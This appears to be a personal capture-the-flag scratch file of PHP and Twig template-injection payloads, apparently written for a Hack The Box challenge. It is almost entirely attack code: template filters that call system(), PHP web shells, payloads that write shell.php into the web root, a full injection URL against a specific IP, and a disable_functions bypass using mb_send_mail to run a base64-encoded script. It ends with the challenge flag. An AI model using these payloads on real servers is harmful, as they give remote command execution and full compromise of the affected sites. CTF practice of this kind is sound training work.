'''
PHP + SSTI
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass

{{['/readflag']|filter('system')}}

{{['id']|filter('system')}}

{{['id',""]|sort('system')}}

<?=`$_GET[_]`?>

?location={{{"<?php%20phpinfo();":"/www/public/shell.php"}|map("file_put_contents")}}

?location={{{"<?=`$_GET[_]`?>":"/www/public/shell.php"}|map("file_put_contents")}}


http://83.136.255.162:31611/?location={{{%22%3C?=`$_GET[_]`?%3E%22:%22/www/public/shell2.php%22}|map(%22file_put_contents%22)}}

<?php $output = `ls -l`; echo "<pre>$output</pre>";?>

<?php $code = 'id;'; eval($code);?>

<?php include('/etc/hosts'); ?>

ini_restore('disable_functions')

pcntl_exec('/readflag', []);

file_put_contents('/www/readflag.sh', base64_decode('L3JlYWRmbGFnID4gL3RtcC9mbGFnLnR4dAo=')); chmod('/www/readflag.sh', 0777);  mb_send_mail('', '', '', '-H \"exec /www/readflag.sh\"'); echo file_get_contents('/tmp/flag.txt');

<?php file_put_contents('/www/readflag.sh', base64_decode('L3JlYWRmbGFnID4gL3RtcC9mbGFnLnR4dAo=')); chmod('/www/readflag.sh', 0777); $additional_headers = 'From: ' . \"\r\n\"; $additional_headers .= 'X-Additional-Header: whatever' . \"\r\n\"; $additional_parameter = '-H \"exec /www/readflag.sh\"';  mb_send_mail('', '', '', $additional_headers, $additional_parameter);  echo file_get_contents('/tmp/flag.txt'); ?>


<?php
// Write the base64-decoded content to a file
file_put_contents('/www/public/readflag.sh', base64_decode('L3JlYWRmbGFnID4gL3d3dy9wdWJsaWMvZmxhZy50eHQK'));

// Change the permissions of the file to be executable
chmod('/www/public/readflag.sh', 0777);

// Prepare the additional headers for executing the shell script
$additional_headers = 'From: ' . "\r\n";
$additional_headers .= 'X-Additional-Header: whatever' . "\r\n";
$additional_parameter = '-H "exec /www/public/readflag.sh"';

// Send the email with the additional parameter to execute the shell script
mb_send_mail('', '', '', $additional_headers, $additional_parameter);

// Read the content of the file presumably created by the shell script
echo file_get_contents('/www/public/flag.txt');
?>

?location={{{"<?php file_put_contents('/www/public/readflag.sh', base64_decode('L3JlYWRmbGFnID4gL3d3dy9wdWJsaWMvZmxhZy50eHQK')); chmod('/www/public/readflag.sh', 0777); $additional_headers = 'From: ' . \"\r\n\"; $additional_headers .= 'X-Additional-Header: whatever' . \"\r\n\"; $additional_parameter = '-H \"exec /www/public/readflag.sh\"';  mb_send_mail('', '', '', $additional_headers, $additional_parameter);  echo file_get_contents('/www/public/flag.txt'); ?>":"/www/public/shell.php"}|map("file_put_contents")}}

HTB{byp4ss1ng_d1s4bl3d_fuNc7i0n5_and_0p3n_b4s3d1r_c4n_b3_s0_mund4n3}
'''
